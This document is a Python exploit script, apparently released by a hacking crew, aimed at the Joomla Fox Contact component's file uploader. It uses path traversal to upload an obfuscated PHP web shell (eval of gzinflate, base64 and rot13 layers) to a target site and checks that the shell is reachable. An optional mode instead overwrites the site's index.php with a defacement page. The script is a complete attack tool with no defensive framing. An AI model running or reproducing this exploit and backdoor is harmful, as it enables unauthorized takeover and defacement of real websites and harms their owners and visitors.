import colorama # pip3 install colorama
from colorama import Fore as F
import requests as r # pip3 install requests
import argparse as arg
import os as sistema
sistema.system('cls' if sistema.name == 'nt' else 'reset')
index = r"""
________________________________________________________
__     __          _                  _____    Recoda não comédia!               
\ \   / /         | |                / ____|                  
 \ \_/ /   _ _ __ | | _____ _ __ ___| |     _ __ _____      __
  \   / | | | '_ \| |/ / _ \ '__/ __| |    | '__/ _ \ \ /\ / /
   | || |_| | | | |   <  __/ |  \__ \ |____| | |  __/\ V  V / 
   |_| \__,_|_| |_|_|\_\___|_|  |___/\_____|_|  \___| \_/\_/  
 								
Joomla "fox contact" R.F.U exploit
Criado por Supr3m0 (Yunkers Crew)
Github: github.com/2inf3rnal/
Facebook: www.fb.com/yunkers01/
________________________________________________________
"""
def arruma(url):
	if url[-1] != "/":
		url = url + "/"
	if url[:7] != "http://" and url[:8] != "https://":
		url = "http://" + url
	return url
user_agent = {'User-agent': 'Mozilla/5.0'}
parser = arg.ArgumentParser(description = "Exploit by supr3m0")

parser.add_argument("--url", action='store', help = "Site alvo.", required = True)
parser.add_argument("--cid", action='store',  help = "ID do plugin", required = True)
parser.add_argument("--bypass", action='store_true', help = "Troca o cid para 0 e mid para o cid inserido")
parser.add_argument("--index", action='store_true', help = "Invade em index")
parser.add_argument("--threads", action='store', type = int, default = "10", help = "Tempo para cada requisição.")
param = parser.parse_args()

print(F.GREEN + index)
print(F.GREEN + "[+] Site:" + F.WHITE + "", param.url)
print(F.GREEN + "[+] ID:" + F.WHITE + "", param.cid)
if param.bypass:
	cid_bypass = "0"
else:
	cid_bypass = param.cid
joomla_diretorios = ["components/com_foxcontact/lib/file-uploader.php?cid={}&mid={}&qqfile=/../../_func.php".format(cid_bypass, param.cid), "index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id={}?cid={}&mid={}&qqfile=/../../_func.php".format(param.cid, cid_bypass, param.cid), "index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id={}&cid={}&mid={}&owner=module&id={}&qqfile=/../../_func.php".format(param.cid, cid_bypass, param.cid, param.cid), "components/com_foxcontact/lib/uploader.php?cid={}&mid={}&qqfile=/../../_func.php".format(cid_bypass, param.cid)]
shell = r"""<center>
<h5>Upload Form Yunkers Crew</h5>
<?php eval (gzinflate(base64_decode(str_rot13("ML/EF8ZjRZnsUrk/hVMOJaQZS19pZ3kkVNtX06qEFgnxAct0bH2RGin/zljgT/c2q9
/iih+BI40TaSguWq98TXxc4k0pOiufqT+K7WvibboK8kxCfTyZ6IddrWcAV5mKhyANXlg0FkNPkJ2wTHUTrlQtoJHUjjyFGycunTqKtI8lnvzPLRJ
DT6ZEPUoIKJWkYyewYRFaJxt+epn6S0qs39+umDuTfsEJnSmd3HRWTkCv/WgX54K4g98833KBSUHXv/Ygqsr+k4USOENPRjxM/ZkaAk56eYDM0xJ5
sK552h1khNHKr2lIXpZOhYvSs2VHZh8O8oKbPibYUutxFLYKpCY2KCo8Y7ByDy6D0l8=")))); ?>
</center>"""
diretorios = 0
if param.index:
	joomla_diretorios = [letra.replace("/../../_func.php", "/../../../../index.php") for letra in joomla_diretorios]
	shell = """
<html>
<head>
	<meta charset="utf-8">
	<title>./yc.py</title>
	<link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet">
</head>
<body bgcolor="white">
	<center><font size="5" face="Lato" color="black">Hackeado pela</font></center>
	<center><font size="10" face="Lato" color="black">Yunkers Crew</font></center>
	<center><font size="3" face="Lato" color="black">Supr3m0 passou aqui :/</font></center>
	<center><font size="3" face="Lato" color="black">Nois ta de volta, pra alegria dos hater haha</font></center>
	<center><img src="http://cdn5.colorir.com/desenhos/pintar/fantasma-classico_2.png" alt="Smiley face" height="250" width="400"></center>
	<center><font size="4" face="Lato" color="black">Somos: Supr3m0, W4r1o6k, V4por, F1r3Bl00d, Pr0sex & Cooldsec</font></center>
	<center><font size="4" face="Lato" color="black">Salve: Xin0x, R41d, Junin, M0nst4r & CryptonKing, Jonas sz</font></center>
	</br>
	<center><font size="5" face="Lato" color="black"><u>www.facebook.com/yunkers01/</u></font></center>
	<iframe width="1" height="1" src="https://www.youtube.com/embed/K4xl1T_lyiM?autoplay=1&controls=0&repeat=1" frameborder="0" allowfullscreen></iframe>
</body>
</html>
	"""

url = arruma(param.url)
try:
	for diretorio in joomla_diretorios:
		diretorios += 1
		url_vuln = url + diretorio
		shell_dir = url + "components/com_foxcontact/_func.php"
		checa_site = r.get(url_vuln, headers=user_agent)
		if '{"' in checa_site.text:
			print(F.GREEN + "\n[!] " + F.WHITE + " Inserindo payload no diretorio {}...".format(diretorios))
			envia_shell = r.post(url_vuln, data=shell, headers=user_agent)
			print(F.YELLOW + "[!] "+ F.WHITE + "Respondeu:")
			print(F.CYAN + envia_shell.text)
			verifica_shell = r.get(shell_dir, headers=user_agent)
			if verifica_shell.status_code != 404:
				print(F.GREEN + "\n[*]" + F.WHITE + " Shell enviada com sucesso!!!")
				print(F.GREEN + "[+]" + F.WHITE + " Local da shell: "+shell_dir)
				input("Aperte enter para continuar")
			else:
				print(F.RED + "[-] "+ F.WHITE + "Nao encontrei a shell: ", shell_dir)
		else:
			print(F.RED + "\n[-] " + F.WHITE + " Diretorio nao vulneravel: {}.".format(diretorios))
except Exception as iu:
	print(iu)
print(F.WHITE + "")
